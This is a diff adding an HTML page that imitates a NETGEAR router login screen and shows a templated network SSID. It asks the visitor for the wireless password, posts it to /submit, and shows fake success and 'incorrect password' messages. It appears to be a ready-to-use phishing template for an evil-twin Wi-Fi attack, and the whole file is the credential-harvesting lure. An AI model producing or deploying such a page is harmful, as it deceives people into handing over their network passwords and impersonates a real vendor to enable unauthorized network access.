@@ -1,0 +1,290 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>NETGEAR Router Login - {{ssid}}</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background: #1e3a5f;
+            min-height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            padding: 20px;
+        }
+
+        .container {
+            background: white;
+            border-radius: 8px;
+            box-shadow: 0 4px 20px rgba(0, 0, 0, 0.3);
+            max-width: 500px;
+            width: 100%;
+            overflow: hidden;
+        }
+
+        .header {
+            background: linear-gradient(135deg, #0099cc 0%, #006699 100%);
+            padding: 25px;
+            text-align: center;
+        }
+
+        .logo {
+            color: white;
+            font-size: 28px;
+            font-weight: bold;
+            letter-spacing: 2px;
+        }
+
+        .tagline {
+            color: rgba(255, 255, 255, 0.9);
+            font-size: 13px;
+            margin-top: 5px;
+        }
+
+        .content {
+            padding: 35px;
+        }
+
+        .title {
+            font-size: 20px;
+            color: #333;
+            margin-bottom: 10px;
+            font-weight: 600;
+        }
+
+        .subtitle {
+            color: #666;
+            font-size: 14px;
+            margin-bottom: 25px;
+        }
+
+        .network-box {
+            background: #f8f9fa;
+            border-left: 4px solid #0099cc;
+            padding: 15px;
+            margin-bottom: 25px;
+        }
+
+        .network-label {
+            color: #666;
+            font-size: 12px;
+            text-transform: uppercase;
+            margin-bottom: 5px;
+        }
+
+        .network-name {
+            color: #0099cc;
+            font-size: 18px;
+            font-weight: 600;
+        }
+
+        .form-group {
+            margin-bottom: 20px;
+        }
+
+        label {
+            display: block;
+            color: #555;
+            font-size: 14px;
+            font-weight: 600;
+            margin-bottom: 8px;
+        }
+
+        input[type="password"] {
+            width: 100%;
+            padding: 12px 15px;
+            border: 2px solid #ddd;
+            font-size: 14px;
+            border-radius: 4px;
+            transition: border-color 0.3s;
+        }
+
+        input[type="password"]:focus {
+            outline: none;
+            border-color: #0099cc;
+        }
+
+        button {
+            width: 100%;
+            padding: 14px;
+            background: linear-gradient(135deg, #0099cc 0%, #006699 100%);
+            color: white;
+            border: none;
+            border-radius: 4px;
+            font-size: 15px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: transform 0.2s, box-shadow 0.2s;
+        }
+
+        button:hover {
+            transform: translateY(-1px);
+            box-shadow: 0 4px 12px rgba(0, 153, 204, 0.4);
+        }
+
+        button:active {
+            transform: translateY(0);
+        }
+
+        button:disabled {
+            opacity: 0.6;
+            cursor: not-allowed;
+        }
+
+        .error {
+            background: #fff3f3;
+            border-left: 4px solid #d32f2f;
+            color: #d32f2f;
+            padding: 12px 15px;
+            margin-bottom: 20px;
+            border-radius: 4px;
+            font-size: 14px;
+            display: none;
+        }
+
+        .error.show {
+            display: block;
+        }
+
+        .help-text {
+            color: #999;
+            font-size: 12px;
+            margin-top: 10px;
+            text-align: center;
+        }
+
+        .footer {
+            background: #f8f9fa;
+            padding: 20px;
+            text-align: center;
+            border-top: 1px solid #e0e0e0;
+        }
+
+        .footer-text {
+            color: #888;
+            font-size: 11px;
+        }
+
+        .spinner {
+            display: inline-block;
+            width: 14px;
+            height: 14px;
+            border: 2px solid rgba(255, 255, 255, 0.3);
+            border-radius: 50%;
+            border-top-color: white;
+            animation: spin 0.8s linear infinite;
+            margin-right: 8px;
+            display: none;
+            vertical-align: middle;
+        }
+
+        button:disabled .spinner {
+            display: inline-block;
+        }
+
+        @keyframes spin {
+            to { transform: rotate(360deg); }
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="header">
+            <div class="logo">NETGEAR</div>
+            <div class="tagline">Wireless Router</div>
+        </div>
+
+        <div class="content">
+            <div class="title">Network Authentication Required</div>
+            <div class="subtitle">Please enter your wireless password to continue</div>
+
+            <div class="network-box">
+                <div class="network-label">Network SSID</div>
+                <div class="network-name">{{ssid}}</div>
+            </div>
+
+            <div class="error" id="error"></div>
+
+            <form id="loginForm" method="POST" action="/submit">
+                <div class="form-group">
+                    <label for="password">Wireless Password</label>
+                    <input
+                        type="password"
+                        id="password"
+                        name="password"
+                        required
+                        autocomplete="off"
+                        placeholder="Enter your password"
+                    >
+                </div>
+
+                <button type="submit" id="submitBtn">
+                    <span class="spinner"></span>
+                    <span>Connect to Network</span>
+                </button>
+
+                <div class="help-text">
+                    Your password is case-sensitive
+                </div>
+            </form>
+        </div>
+
+        <div class="footer">
+            <div class="footer-text">
+                © 2025 NETGEAR, Inc. and/or its affiliates. All rights reserved.
+            </div>
+        </div>
+    </div>
+
+    <script>
+        const form = document.getElementById('loginForm');
+        const submitBtn = document.getElementById('submitBtn');
+        const errorDiv = document.getElementById('error');
+
+        form.addEventListener('submit', function(e) {
+            e.preventDefault();
+
+            submitBtn.disabled = true;
+            errorDiv.classList.remove('show');
+
+            const formData = new FormData(form);
+
+            fetch('/submit', {
+                method: 'POST',
+                body: formData
+            })
+            .then(response => response.json())
+            .then(data => {
+                if (data.success) {
+                    errorDiv.textContent = '✓ Connection established successfully!';
+                    errorDiv.style.background = '#f1f8f4';
+                    errorDiv.style.borderLeftColor = '#4caf50';
+                    errorDiv.style.color = '#2e7d32';
+                    errorDiv.classList.add('show');
+
+                    setTimeout(() => {
+                        window.location.href = '/success';
+                    }, 1500);
+                } else {
+                    throw new Error(data.message || 'Authentication failed');
+                }
+            })
+            .catch(error => {
+                submitBtn.disabled = false;
+                errorDiv.textContent = '✗ Incorrect password. Please try again.';
+                errorDiv.classList.add('show');
+                document.getElementById('password').value = '';
+                document.getElementById('password').focus();
+            });
+        });
+    </script>
+</body>
+</html>
